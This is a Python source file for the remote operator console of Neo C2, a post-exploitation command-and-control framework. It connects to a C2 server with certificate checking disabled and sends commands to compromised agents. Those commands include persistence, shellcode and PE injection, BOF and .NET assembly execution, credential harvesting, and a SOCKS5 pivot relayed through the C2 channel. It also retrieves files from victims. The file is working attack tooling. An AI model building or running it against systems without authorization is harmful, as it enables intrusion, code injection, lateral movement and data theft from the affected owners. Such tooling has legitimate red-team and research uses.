"""
The Neo C2 Framework is a post-exploitation command and control framework.

This file is part of Neo C2 Framework.
Copyright (C) 2025 @stillbigjosh

The Neo C2 Framework of this edition is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

The Neo C2 Framework is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Neo.  If not, see <http://www.gnu.org/licenses/>
"""

#!/usr/bin/env python3

import os
import sys
import socket
import argparse
import json
import ssl
import getpass
import threading
import time
import readline
from datetime import datetime
from pathlib import Path
import select
import signal
import subprocess
import struct
import base64

# Initialize color support
try:
    from rich.console import Console
    from rich.text import Text
    from rich import print as rich_print
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False

# Import CLI extender - handle both execution contexts (from Neo root and from cli directory)
import sys
import os
script_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.dirname(script_dir)

# Add project root to path to support imports from cli subdirectory
if project_root not in sys.path:
    sys.path.insert(0, project_root)

try:
    # First try the standard import (works when run from Neo root)
    from cli.extender import CLIExtender
    EXTENDER_AVAILABLE = True
except ImportError:
    try:
        # If that fails, try importing directly (works when run from cli directory)
        # Add script directory to path for direct imports
        if script_dir not in sys.path:
            sys.path.insert(0, script_dir)
        from extender import CLIExtender
        EXTENDER_AVAILABLE = True
    except ImportError:
        EXTENDER_AVAILABLE = False
        CLIExtender = None

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORS_ENABLED = True
except ImportError:
    COLORS_ENABLED = False
    class Fore:
        RED = '\033[31m'
        GREEN = '\033[32m'
        YELLOW = '\033[33m'
        BLUE = '\033[34m'
        MAGENTA = '\033[35m'
        CYAN = '\033[36m'
        WHITE = '\033[37m'
        RESET = '\033[0m'

    class Back:
        pass  # Add background colors if needed later

    class Style:
        BRIGHT = '\033[1m'
        DIM = '\033[2m'
        RESET_ALL = '\033[0m'

def colored(text, color_code):
    if COLORS_ENABLED:
        return f"{color_code}{text}{Style.RESET_ALL}"
    return text

def red(text):
    return colored(text, Fore.RED)

def green(text):
    return colored(text, Fore.GREEN)

def yellow(text):
    return colored(text, Fore.YELLOW)

def blue(text):
    return colored(text, Fore.BLUE)

def magenta(text):
    return colored(text, Fore.MAGENTA)

def cyan(text):
    return colored(text, Fore.CYAN)

def bright(text):
    return f"{Style.BRIGHT}{text}{Style.RESET_ALL}" if COLORS_ENABLED else text

class NeoC2RemoteCLI:

    def __init__(self, server_host, server_port, username, password, use_ssl=True):
        self.server_host = server_host
        self.server_port = server_port
        self.username = username
        self.password = password
        self.use_ssl = use_ssl
        self.auth_token = None
        self.connected = False
        self.session_id = None
        self.command_history = []
        self.is_interactive_mode = False
        self.current_agent = None

        try:
            self.COLORS = {
                'success': Fore.GREEN,
                'error': Fore.RED,
                'info': Fore.BLUE,
                'warning': Fore.YELLOW,
                'prompt': Fore.CYAN,
                'reset': Style.RESET_ALL
            }
        except NameError:
            self.COLORS = {
                'success': '',
                'error': '',
                'info': '',
                'warning': '',
                'prompt': '',
                'reset': ''
            }

        self.history_file = os.path.expanduser("~/.neoc2_remote_cli_history")
        if os.path.exists(self.history_file):
            try:
                readline.read_history_file(self.history_file)
            except:
                pass
        readline.set_history_length(1000)

        readline.set_completer_delims(' \t\n')
        readline.parse_and_bind("tab: complete")
        readline.set_completer(self._completer)

        self.socket_lock = threading.Lock()

        self.interactive_command_sent = False
        self.interactive_command_start_time = None

        # For handling agent updates and alerts
        self.active_agents = {}
        self.agent_update_lock = threading.Lock()

        # For periodic agent updates
        self.agent_refresh_thread = None
        self.agent_refresh_stop_event = threading.Event()

        # Queue for handling agent updates without interfering with command responses
        self.agent_update_queue = []
        self.agent_queue_lock = threading.Lock()

        # For tracking command responses and correlating them properly
        self.pending_command_response = None
        self.response_received = threading.Event()

        # For the message receiving thread
        self.receive_thread = None
        self.receive_thread_stop_event = threading.Event()
        self.received_messages = []
        self.received_messages_lock = threading.Lock()

        # Initialize CLI extender if available
        self.extender = None
        if EXTENDER_AVAILABLE and CLIExtender:
            try:
                self.extender = CLIExtender(self)
                print(f"{green('[+]')} CLI extender initialized successfully")
            except Exception as e:
                print(f"{red('[-]')} Error initializing CLI extender: {str(e)}")
                import traceback
                traceback.print_exc()
                self.extender = None
        else:
            # Print debug info about why extender is not available
            print(f"{yellow('[*]')} CLI extender not available:")
            print(f"{yellow('[*]')}   EXTENDER_AVAILABLE: {EXTENDER_AVAILABLE}")
            print(f"{yellow('[*]')}   CLIExtender: {CLIExtender}")

    def _completer(self, text, state):
        commands = [
            'help', 'agent', 'listener', 'modules', 'run', 'pwsh', 'persist', 'pinject', 'peinject', 'execute-pe', 'encryption',
            'profile', 'protocol', 'stager', 'download', 'upload', 'interactive',
            'exit', 'quit', 'clear', 'status', 'task', 'result', 'save', 'addcmd',
            'harvest', 'execute-bof', 'execute-assembly', 'cmd', 'socks', 'payload_upload', 'reporting', 'reverse_proxy', 'failover', 'event'
        ]

        # Add extension commands if available
        if self.extender:
            commands.extend(self.extender.get_available_commands())

        options = [cmd for cmd in commands if cmd.startswith(text.lower())]

        if state < len(options):
            return options[state]
        else:
            return None

    def connect(self):
        try:
            print(f"{blue('[*]')} Connecting to {self.server_host}:{self.server_port}")

            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE

                self.sock = context.wrap_socket(self.sock, server_hostname=self.server_host)

            self.sock.connect((self.server_host, self.server_port))
            self.connected = True

            print(f"{green('[+]')} Connected to NeoC2 server")

            if self._authenticate():
                print(f"{green('[+]')} Authentication successful")
                return True
            else:
                print(f"{red('[-]')} Authentication failed")
                return False

        except Exception as e:
            print(f"{red('[-]')} Connection error: {str(e)}")
            return False

    def _authenticate(self):
        try:
            auth_data = {
                'type': 'auth',
                'username': self.username,
                'password': self.password,
                'client_type': 'remote_cli'
            }

            self._send_data(auth_data)

            response = self._receive_data()

            if response and response.get('success'):
                self.auth_token = response.get('token')
                self.session_id = response.get('session_id')

                user_info = response.get('user_info', {})
                if user_info:
                    print(f"{green('[+]')} User: {user_info.get('username', 'unknown')}")
                    print(f"{green('[+]')} Role: {user_info.get('role', 'unknown')}")

                # Handle initial agents data from server (if any were active)
                agents = response.get('agents', [])
                if agents:
                    with self.agent_update_lock:
                        for agent in agents:
                            agent_id = agent.get('id')
                            if agent_id:
                                self.active_agents[agent_id] = agent
                    print(f"{green('[+]')} Received {len(agents)} active agents from server")

                return True
            else:
                error_msg = response.get('error', 'Authentication failed')
                print(f"{red('[-]')} Authentication error: {error_msg}")
                return False

        except Exception as e:
            print(f"{red('[-]')} Authentication error: {str(e)}")
            return False

    def _send_data(self, data):
        try:
            json_data = json.dumps(data)
            message = json_data.encode('utf-8')

            length = len(message)
            with self.socket_lock:
                if not self.connected:
                    raise Exception("Socket not connected")
                self.sock.sendall(length.to_bytes(4, byteorder='big'))
                self.sock.sendall(message)

        except Exception as e:
            raise e

    def _receive_data(self):
        try:
            length_bytes = self._receive_exact(4)
            if not length_bytes:
                return None

            length = int.from_bytes(length_bytes, byteorder='big')

            data = self._receive_exact(length)
            if not data:
                return None

            message = json.loads(data.decode('utf-8'))

            return message

        except Exception as e:
            raise e

    def _start_receive_thread(self):
        self.receive_thread_stop_event.clear()
        self.receive_thread = threading.Thread(target=self._message_receive_worker)
        self.receive_thread.daemon = True
        self.receive_thread.start()

    def _stop_receive_thread(self):
        if self.receive_thread_stop_event:
            self.receive_thread_stop_event.set()
        if self.receive_thread and self.receive_thread.is_alive():
            self.receive_thread.join(timeout=1)

    def _message_receive_worker(self):
        while not self.receive_thread_stop_event.is_set():
            try:
                # Check if there's data available to read
                ready, _, _ = select.select([self.sock], [], [], 0.1)  # 0.1 second timeout

                if ready:
                    try:
                        message = self._receive_data()
                        if message:
                            # Add the received message to the message queue
                            with self.received_messages_lock:
                                self.received_messages.append(message)

                            # If it's an agent update, also add to agent update queue for processing
                            if message.get('type') == 'agent_update':
                                with self.agent_queue_lock:
                                    self.agent_update_queue.append(message)
                    except:
                        # Connection might be lost, break the loop
                        break

            except Exception as e:
                # Error in receiving - might indicate connection issue
                break

    def _get_next_message(self):
        with self.received_messages_lock:
            if self.received_messages:
                return self.received_messages.pop(0)
        return None

    def _receive_command_response_with_agent_updates(self):
        start_time = time.time()
        timeout = 60  # 60 second timeout

        while time.time() - start_time < timeout:
            try:
                # First, process any queued agent updates
                self._process_agent_update_queue()

                # Check if we have any messages in the queue
                message = self._get_next_message()
                if message:
                    # If this is an agent update, add to queue and continue waiting for command response
                    if message.get('type') == 'agent_update':
                        with self.agent_queue_lock:
                            self.agent_update_queue.append(message)
                        # Continue waiting for the actual command response
                        continue
                    else:
                        # This is the command response we're looking for
                        return message

                # No message available yet, wait a bit before checking again
                time.sleep(0.01)

            except Exception as e:
                print(f"[-] Error receiving command response: {str(e)}")
                return None

        # Timeout reached
        return None

    def _receive_exact(self, length):
        data = b''
        while len(data) < length:
            with self.socket_lock:
                if not self.connected:
                    return None
                chunk = self.sock.recv(length - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def send_command(self, command):
        try:
            command_parts = command.strip().split()

            # Check if this is an extension command (like 'whoami' which should become 'execute-bof whoami.x64.o')
            if self.extender and self.extender.is_extension_command(command):
                # Handle extension command by converting it to the appropriate execute command
                converted_command = self.extender.handle_extension_command(command)
                if converted_command:
                    # Only show a brief message that the command is being processed
                    print(f"{blue('[*]')} Processing extension command: '{command}'")
                    command_data = {
                        'type': 'command',
                        'command': converted_command,
                        'token': self.auth_token,
                        'session_id': self.session_id
                    }
                else:
                    # If conversion failed, send original command
                    command_data = {
                        'type': 'command',
                        'command': command,
                        'token': self.auth_token,
                        'session_id': self.session_id
                    }
            # Check if this is an extension command that needs client-side file lookup
            elif command_parts and command_parts[0].lower() in ['execute-bof', 'execute-assembly', 'peinject', 'execute-pe', 'pwsh', 'pinject']:
                result = self._handle_extension_command(command)
                if result and result != "FILE_NOT_FOUND_ON_CLIENT" and result != "NO_FILE_SPECIFIED" and result != "PREFLIGHT_CHECK_FAILED":
                    # File was found and processed successfully
                    command_data = {
                        'type': 'command',
                        'command': result,
                        'token': self.auth_token,
                        'session_id': self.session_id
                    }
                elif result == "FILE_NOT_FOUND_ON_CLIENT":
                    # File was specified but not found, error was already printed
                    # Return error response to prevent sending to server
                    return {'success': False, 'error': f'File not found locally: {command_parts[1]}'}
                elif result == "PREFLIGHT_CHECK_FAILED":
                    # Pre-flight check failed, error was already printed
                    # Return error response to prevent sending to server
                    return {'success': False, 'error': f'Pre-flight check failed for command: {command}'}
                else:
                    # _handle_extension_command returned "NO_FILE_SPECIFIED", which means no filename was provided
                    # Send original command to server for usage info
                    command_data = {
                        'type': 'command',
                        'command': command,
                        'token': self.auth_token,
                        'session_id': self.session_id
                    }
            elif len(command_parts) >= 3 and command_parts[0].lower() == 'profile' and command_parts[1].lower() == 'add':
                profile_file_path = command_parts[2]

                if not profile_file_path.startswith('base64:'):
                    if not os.path.exists(profile_file_path):
                        return {'success': False, 'error': f"Profile file not found: {profile_file_path}"}

                    with open(profile_file_path, 'r') as f:
                        json_content = f.read()

                    import base64
                    encoded_content = base64.b64encode(json_content.encode('utf-8')).decode('utf-8')

                    modified_command = f"profile add base64:{encoded_content}"

                    command_data = {
                        'type': 'command',
                        'command': modified_command,
                        'token': self.auth_token,
                        'session_id': self.session_id
                    }
                else:
                    command_data = {
                        'type': 'command',
                        'command': command,
                        'token': self.auth_token,
                        'session_id': self.session_id
                    }
            else:
                command_data = {
                    'type': 'command',
                    'command': command,
                    'token': self.auth_token,
                    'session_id': self.session_id
                }

            # Show loading animation since module commands in interactive mode still need to wait for results
            loading_stop_event = threading.Event()
            loading_thread = threading.Thread(target=self._show_loading_animation, args=(loading_stop_event,))
            loading_thread.daemon = True
            loading_thread.start()

            if self.is_interactive_mode:
                self.interactive_command_sent = True
                import time
                self.interactive_command_start_time = time.time()

            self._send_data(command_data)

            # Receive response with a timeout to allow processing agent updates in background
            response = self._receive_command_response_with_agent_updates()

            if loading_thread and loading_stop_event:
                loading_stop_event.set()
                loading_thread.join(timeout=0.1)

            return response

        except Exception as e:
            if 'loading_stop_event' in locals():
                loading_stop_event.set()

            print(f"{red('[-]')} Error sending command: {str(e)}")
            self.connected = False
            return None

    def start_socks_proxy(self, local_port=1080):
        try:
            # Create a socket to listen for SOCKS connections from local tools (like proxychains)
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('127.0.0.1', local_port))
            server_socket.listen(5)

            print(f"{green('[+]')} SOCKS5 proxy listening on 127.0.0.1:{local_port}")
            print(f"{green('[+]')} Configure your tools to use socks5://127.0.0.1:{local_port}")

            while True:
                try:
                    client_conn, client_addr = server_socket.accept()
                    print(f"{green('[+]')} New SOCKS client connection from {client_addr}")

                    # Start a thread to handle this SOCKS client
                    client_thread = threading.Thread(
                        target=self._handle_socks_client,
                        args=(client_conn, client_addr),
                        daemon=True
                    )
                    client_thread.start()

                except Exception as e:
                    print(f"{red('[-]')} Error accepting SOCKS connection: {str(e)}")
                    break

        except Exception as e:
            print(f"{red('[-]')} Error starting SOCKS proxy: {str(e)}")
        finally:
            try:
                server_socket.close()
            except:
                pass

    def _handle_socks_client(self, client_conn, client_addr):
        try:
            # Read the version identifier and number of methods
            header = self._read_exact(client_conn, 2)
            if not header or header[0] != 0x05:
                print(f"{red('[-]')} Invalid SOCKS5 version from {client_addr}")
                client_conn.close()
                return

            n_methods = header[1]
            if n_methods <= 0 or n_methods > 255:
                print(f"{red('[-]')} Invalid number of methods from {client_addr}")
                client_conn.close()
                return

            # Read the methods
            methods = self._read_exact(client_conn, n_methods)
            if not methods:
                client_conn.close()
                return

            # Send no-authentication required response
            client_conn.sendall(b'\x05\x00')

            # Read request header
            request_header = self._read_exact(client_conn, 4)
            if not request_header or request_header[0] != 0x05:
                print(f"{red('[-]')} Invalid SOCKS5 request version from {client_addr}")
                client_conn.close()
                return

            cmd = request_header[1]
            if cmd != 0x01:  # CONNECT command
                # Send error response
                client_conn.sendall(b'\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00')  # Command not supported
                client_conn.close()
                return

            addr_type = request_header[3]

            # Read address and port
            if addr_type == 0x01:  # IPv4
                addr_bytes = self._read_exact(client_conn, 4)
                port_bytes = self._read_exact(client_conn, 2)
                if not addr_bytes or not port_bytes:
                    client_conn.close()
                    return
                addr = socket.inet_ntoa(addr_bytes)
            elif addr_type == 0x03:  # Domain name
                addr_len = ord(self._read_exact(client_conn, 1))
                addr_bytes = self._read_exact(client_conn, addr_len)
                if not addr_bytes:
                    client_conn.close()
                    return
                addr = addr_bytes.decode('utf-8')
                port_bytes = self._read_exact(client_conn, 2)
                if not port_bytes:
                    client_conn.close()
                    return
            elif addr_type == 0x04:  # IPv6
                addr_bytes = self._read_exact(client_conn, 16)
                port_bytes = self._read_exact(client_conn, 2)
                if not addr_bytes or not port_bytes:
                    client_conn.close()
                    return
                addr = socket.inet_ntop(socket.AF_INET6, addr_bytes)
            else:
                # Send error response
                client_conn.sendall(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')  # Address type not supported
                client_conn.close()
                return

            port = int.from_bytes(port_bytes, 'big')

            # Prepare address (use bracketed IPv6 when necessary)
            if ':' in addr:  # IPv6
                target_addr = f"[{addr}]:{port}"
            else:  # IPv4 or domain
                target_addr = f"{addr}:{port}"

            print(f"{green('[*]')} SOCKS5 connect request to {target_addr}")

            # Send success response - we'll relay to the agent via the C2 channel
            client_conn.sendall(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')

            print(f"{green('[+]')} Connected to {target_addr} via C2 channel")

            self._relay_data_through_c2(client_conn, addr, port)

        except Exception as e:
            print(f"{red('[-]')} Error in SOCKS5 handler: {str(e)}")
            try:
                client_conn.close()
            except:
                pass

    def _read_exact(self, sock, length):
        data = b''
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def _relay_data_through_c2(self, client_socket, target_addr, target_port):
        try:
            # Connect to the server's CLI SOCKS proxy port (determined when 'socks' command was run)
            # This assumes the server has started the CLI SOCKS proxy for this agent
            server_port = getattr(self, 'server_socks_proxy_port', 1080)  # Default to 1080 if not set
            proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_socket.connect((self.server_host, server_port))

            # Now relay data between the client and the server's CLI SOCKS proxy
            # which will forward to the agent
            def relay(src, dst, name1, name2):
                try:
                    while True:
                        data = src.recv(4096)
                        if not data:
                            break
                        dst.sendall(data)
                except Exception as e:
                    print(f"{red('[-]')} Relay error between {name1} and {name2}: {str(e)}")
                finally:
                    try:
                        src.close()
                    except:
                        pass
                    try:
                        dst.close()
                    except:
                        pass

            # Start two threads for bidirectional relay
            thread1 = threading.Thread(target=relay, args=(client_socket, proxy_socket, "client", "server_cli_proxy"), daemon=True)
            thread2 = threading.Thread(target=relay, args=(proxy_socket, client_socket, "server_cli_proxy", "client"), daemon=True)

            thread1.start()
            thread2.start()

            # Wait for threads to complete
            thread1.join()
            thread2.join()

        except ConnectionRefusedError:
            print(f"{red('[-]')} Connection refused: Server CLI SOCKS proxy may not be running. Make sure to run 'socks' command first.")
            try:
                client_socket.close()
            except:
                pass
        except Exception as e:
            print(f"{red('[-]')} Error in C2 data relay: {str(e)}")
            try:
                client_socket.close()
            except:
                pass

    def _handle_extension_command(self, command):
        import os
        import base64
        import re
        import hashlib

        command_parts = command.strip().split()
        if not command_parts:
            return None

        cmd_name = command_parts[0].lower()
        if len(command_parts) < 2:
            return None  # Not enough arguments

        # Parse arguments to extract the file path
        # Handle both formats: pwsh whoami.ps1 and pwsh script_path=whoami.ps1
        file_path = None
        arguments = []

        # Check if the command uses key-value format like script_path=whoami.ps1
        for part in command_parts[1:]:
            if '=' in part:
                # This is a key-value pair, check if it's for file path
                key, value = part.split('=', 1)
                key_lower = key.lower()

                # Identify the file path based on the command type
                if cmd_name == 'pwsh' and key_lower in ['script_path', 'scriptpath']:
                    file_path = value
                elif cmd_name == 'execute-bof' and key_lower in ['bof_path', 'bofpath']:
                    file_path = value
                elif cmd_name == 'execute-assembly' and key_lower in ['assembly_path', 'assemblypath']:
                    file_path = value
                elif cmd_name in ['peinject', 'execute-pe'] and key_lower in ['pe_file', 'pefile']:
                    file_path = value
                elif cmd_name == 'pinject' and key_lower in ['shellcode', 'script_path', 'scriptpath']:
                    file_path = value
                else:
                    arguments.append(part)  # Add as regular argument
            else:
                # This is a positional argument
                if file_path is None:
                    file_path = part  # First positional argument is the file path
                else:
                    arguments.append(part)  # Additional positional arguments

        if file_path is None:
            return "NO_FILE_SPECIFIED"  # No file path found, indicate this specifically

        # Define file search paths for different extension types
        if cmd_name == 'execute-bof':
            search_paths = [
                os.path.join('cli', 'extensions', 'bof', file_path),
                os.path.join('cli', 'extensions', file_path),
                file_path,  # Direct path
                os.path.join(os.getcwd(), file_path),
                os.path.join('cli', 'extensions', 'bof', os.path.basename(file_path)),
                os.path.join('cli', 'extensions', os.path.basename(file_path)),
            ]

        elif cmd_name == 'execute-assembly':
            search_paths = [
                os.path.join('cli', 'extensions', 'assemblies', file_path),
                os.path.join('cli', 'extensions', file_path),
                file_path,  # Direct path
                os.path.join(os.getcwd(), file_path),
                os.path.join('cli', 'extensions', 'assemblies', os.path.basename(file_path)),
                os.path.join('cli', 'extensions', os.path.basename(file_path)),
            ]

        elif cmd_name == 'peinject':
            search_paths = [
                os.path.join('cli', 'extensions', file_path),
                os.path.join('cli', 'extensions', 'pe', file_path),
                file_path,  # Direct path
                os.path.join(os.getcwd(), file_path),
                os.path.join('cli', 'extensions', os.path.basename(file_path)),
                os.path.join('cli', 'extensions', 'pe', os.path.basename(file_path)),
            ]
        elif cmd_name == 'execute-pe':
            search_paths = [
                os.path.join('cli', 'extensions', 'pe', file_path),
                os.path.join('cli', 'extensions', file_path),
                file_path,  # Direct path
                os.path.join(os.getcwd(), file_path),
                os.path.join('cli', 'extensions', 'pe', os.path.basename(file_path)),
                os.path.join('cli', 'extensions', os.path.basename(file_path)),
            ]

        elif cmd_name == 'pwsh':
            # For pwsh, we look for PowerShell script files
            search_paths = [
                os.path.join('cli', 'extensions', 'powershell', file_path),
                os.path.join('cli', 'extensions', file_path),
                file_path,  # Direct path
                os.path.join(os.getcwd(), file_path),
                os.path.join('cli', 'extensions', 'powershell', os.path.basename(file_path)),
                os.path.join('cli', 'extensions', os.path.basename(file_path)),
            ]

        elif cmd_name == 'pinject':
            # For pinject, we look for shellcode files in the extensions directory
            search_paths = [
                os.path.join('cli', 'extensions', file_path),
                os.path.join('cli', 'extensions', 'shellcode', file_path),
                file_path,  # Direct path
                os.path.join(os.getcwd(), file_path),
                os.path.join('cli', 'extensions', os.path.basename(file_path)),
                os.path.join('cli', 'extensions', 'shellcode', os.path.basename(file_path)),
            ]
        else:
            return None

        # Look for the file in the search paths
        found_file_path = None
        for path in search_paths:
            if os.path.exists(path):
                found_file_path = path
                break

        if found_file_path:
            # File found on client side, read and base64 encode it
            try:
                # For pwsh, we need to read as text, not binary
                if cmd_name == 'pwsh':
                    with open(found_file_path, 'r', encoding='utf-8') as f:
                        file_content = f.read().encode('utf-8')  # Convert to bytes for base64 encoding
                    encoded_content = base64.b64encode(file_content).decode('utf-8')
                # For pinject, we read the file content as-is (should be base64 shellcode)
                elif cmd_name == 'pinject':
                    with open(found_file_path, 'r', encoding='utf-8') as f:
                        encoded_content = f.read().strip()  # Read base64 content directly
                else:
                    with open(found_file_path, 'rb') as f:
                        file_content = f.read()
                    encoded_content = base64.b64encode(file_content).decode('utf-8')

                # Calculate file size and hash for pre-flight check
                file_size = len(file_content)
                file_hash = hashlib.sha256(file_content).hexdigest()

                # For peinject, no prefix needed - server handles the command prefixing
                # The agent expects "peinject <base64_content>" format directly

                # Reconstruct the command with the base64 encoded content
                # Use the original command format to preserve arguments
                original_args = []
                technique_arg = None

                for part in command_parts[1:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        key_lower = key.lower()
                        # Skip file path parameters that were already processed
                        if key_lower not in ['script_path', 'scriptpath', 'bof_path', 'bofpath', 'assembly_path', 'assemblypath', 'pe_file', 'pefile', 'shellcode']:
                            if key_lower == 'technique':
                                technique_arg = value
                            else:
                                original_args.append(part)
                    else:
                        # This is a positional argument, skip the file path (first positional)
                        # since it's already been processed into encoded_content
                        continue

                # Send pre-flight check to server for large payloads
                if file_size > 10240:  # If payload is larger than 10KB, use pre-flight check
                    preflight_command = {
                        'type': 'preflight_check',
                        'command_type': cmd_name,
                        'payload_size': file_size,
                        'payload_hash': file_hash,
                        'token': self.auth_token,
                        'session_id': self.session_id
                    }

                    try:
                        self._send_data(preflight_command)
                        preflight_response = self._receive_data()

                        if not preflight_response or not preflight_response.get('success'):
                            error_msg = preflight_response.get('error', 'Pre-flight check failed') if preflight_response else 'No response from server'
                            print(f"{red('[-]')} Pre-flight check failed: {error_msg}")
                            return "PREFLIGHT_CHECK_FAILED"

                        print(f"{green('[+]')} Pre-flight check passed. Sending {file_size} bytes payload...")

                    except Exception as e:
                        print(f"{red('[-]')} Pre-flight check failed: {str(e)}")
                        return "PREFLIGHT_CHECK_FAILED"

                # Add technique parameter to the command if specified
                if technique_arg:
                    new_command = f"{cmd_name} {technique_arg} {encoded_content} {' '.join(original_args)}"
                elif original_args:
                    new_command = f"{cmd_name} {encoded_content} {' '.join(original_args)}"
                else:
                    new_command = f"{cmd_name} {encoded_content}"

                return new_command
            except Exception as e:
                # Print a clean error message when file reading fails
                print(f"{red('[-]')} Error reading file {found_file_path}: {str(e)}")
                return "FILE_NOT_FOUND_ON_CLIENT"  # Special marker to indicate file error
        else:
            # File not found on client side, print error and return special marker
            print(f"{red('[-]')} File not found: {file_path}")
            return "FILE_NOT_FOUND_ON_CLIENT"  # Special marker to indicate file not found

    def print_result(self, message, status):
        if status == 'file_download':
            try:
                import json
                import base64
                file_data = json.loads(message)
                if file_data.get('type') == 'file_download':
                    filename = file_data.get('filename', 'downloaded_file')
                    content = file_data.get('content', '')
                    size = file_data.get('size', 0)

                    file_bytes = base64.b64decode(content.encode('utf-8'))

                    local_path = f"downloaded_{filename}"
                    with open(local_path, 'wb') as f:
                        f.write(file_bytes)

                    print(f"{green('[+]')} File '{filename}' downloaded successfully!")
                    print(f"{green('[+]')} Saved as: {local_path}")
                    print(f"{green('[+]')} Size: {size} bytes")
                else:
                    print(str(message))
            except Exception as e:
                print(f"{red('[-]')} Error processing file download: {str(e)}")
        elif status == 'success':
            # Handle JSON responses from server
            if isinstance(message, dict):
                # Check for different types of JSON responses
                if 'agents' in message:
                    # Format agents list as a table
                    agents = message.get('agents', [])
                    if not agents:
                        print(f"{blue('[*]')} No active agents found.")
                    else:
                        print("Active Agents:")
                        print("-" * 188)
                        print(f"{'ID':<38} {'IP Address':<15} {'Hostname':<20} {'OS':<15} {'User':<15} {'Listener ID':<38} {'Status':<12} {'Last Seen':<19}")
                        print("-" * 188)
                        for agent in agents:
                            agent_id = agent.get('id', '')
                            ip_address = agent.get('ip_address', '')
                            hostname = agent.get('hostname', '')
                            os_info = agent.get('os_info', '')[:14] if agent.get('os_info') else 'N/A'  # Truncate if too long
                            user = agent.get('user', '')
                            listener_id = agent.get('listener_id', '')
                            status = agent.get('status', '')
                            last_seen = agent.get('last_seen', '')[:19] if agent.get('last_seen') else 'N/A'  # Truncate timestamp

                            print(f"{agent_id:<38} {ip_address:<15} {hostname:<20} {os_info:<15} {user:<15} {listener_id:<38} {status:<12} {last_seen:<19}")
                elif 'listeners' in message:
                    # Format listeners list as a table
                    listeners = message.get('listeners', [])
                    if not listeners:
                        print(f"{blue('[*]')} No listeners found.")
                    else:
                        print("Active Listeners:")
                        print("-" * 125)
                        print(f"{'Name':<15} {'Type':<8} {'Host':<15} {'Port':<6} {'Profile':<20} {'Status':<10} {'ID':<36}")
                        print("-" * 125)
                        for listener in listeners:
                            port_str = str(listener.get('port', '')) if listener.get('port') else 'N/A'
                            profile = listener.get('profile_name', 'default')
                            print(f"{listener.get('name', ''):<15} {listener.get('type', ''):<8} {listener.get('host', ''):<15} {port_str:<6} {profile:<20} {listener.get('status', ''):<10} {listener.get('id', ''):<36}")
                elif 'modules' in message:
                    # Format modules list as a table
                    modules = message.get('modules', [])
                    if not modules:
                        print(f"{blue('[*]')} No modules found. Place modules in the modules/ directory.")
                    else:
                        print("Available Modules:")
                        print("-" * 120)
                        print(f"{'Name':<25} {'Type':<15} {'Technique ID':<15} {'MITRE Tactics':<25} {'Description':<35}")
                        print("-" * 120)
                        for module_info in modules:
                            name = module_info.get('name', 'Unknown')
                            module_type = module_info.get('type', 'unknown')
                            technique_id = module_info.get('technique_id', 'unknown')
                            mitre_tactics = ', '.join(module_info.get('mitre_tactics', []))
                            description = module_info.get('description', 'No description')

                            # Truncate fields if too long
                            if len(name) > 24:
                                name = name[:22] + ".."
                            if len(module_type) > 14:
                                module_type = module_type[:12] + ".."
                            if len(technique_id) > 14:
                                technique_id = technique_id[:12] + ".."
                            if len(mitre_tactics) > 24:
                                mitre_tactics = mitre_tactics[:22] + ".."
                            if len(description) > 34:
                                description = description[:32] + ".."

                            print(f"{name:<25} {module_type:<15} {technique_id:<15} {mitre_tactics:<25} {description:<35}")
                elif 'module_info' in message:
                    # Format module info as before
                    module_info = message.get('module_info', {})
                    print(f"Module Information: {module_info.get('name', 'Unknown')}")
                    print("=" * 80)
                    print(f"Description: {module_info.get('description', 'No description')}")
                    print(f"Type: {module_info.get('type', 'Unknown')}")
                    print(f"Platform: {module_info.get('platform', 'Unknown')}")
                    print(f"Author: {module_info.get('author', 'Unknown')}")
                    print(f"References: {', '.join(module_info.get('references', []))}")

                    if module_info.get('options'):
                        print("\nOptions:")
                        for opt_name, opt_info in module_info['options'].items():
                            print(f"  {opt_name}: {opt_info.get('description', 'No description')}")
                            if opt_info.get('required', False):
                                print("    (Required)")
                            if 'default' in opt_info and opt_info['default'] is not None:
                                print(f"    Default: {opt_info['default']}")
                elif 'profiles' in message:
                    # Format profiles list as a table
                    profiles = message.get('profiles', [])
                    if not profiles:
                        print(f"{blue('[*]')} No profiles found in the database.")
                    else:
                        print("Communication Profiles:")
                        print("-" * 100)
                        print(f"{'ID':<38} {'Name':<20} {'Description':<30}")
                        print("-" * 100)
                        for profile in profiles:
                            profile_id = profile.get('id', 'N/A')
                            name = profile.get('name', 'N/A')
                            description = profile.get('description', 'N/A')

                            # Truncate description if too long
                            if len(description) > 28:
                                description = description[:25] + "..."

                            print(f"{profile_id:<38} {name:<20} {description:<30}")
                elif 'chains' in message:
                    # Format task chains list as a table
                    chains = message.get('chains', [])
                    limit = message.get('limit', 50)
                    if not chains:
                        print(f"{blue('[*]')} No task chains found")
                    else:
                        print(f"Task Chains (limit: {limit}):")
                        print("-" * 150)
                        print(f"{'Chain ID':<38} {'Name':<20} {'Agent ID':<15} {'Status':<12} {'Modules':<25} {'Created':<20}")
                        print("-" * 150)
                        for chain in chains:
                            print(f"{chain.get('chain_id', ''):<38} "
                                  f"{chain.get('name', ''):<20} "
                                  f"{chain.get('agent_id', '')[:14]:<15} "
                                  f"{chain.get('status', ''):<12} "
                                  f"{chain.get('modules', '')[:24]:<25} "
                                  f"{chain.get('created_at', ''):<20}")
                elif 'chain_status' in message:
                    # Format chain status as before
                    chain_status = message.get('chain_status', {})
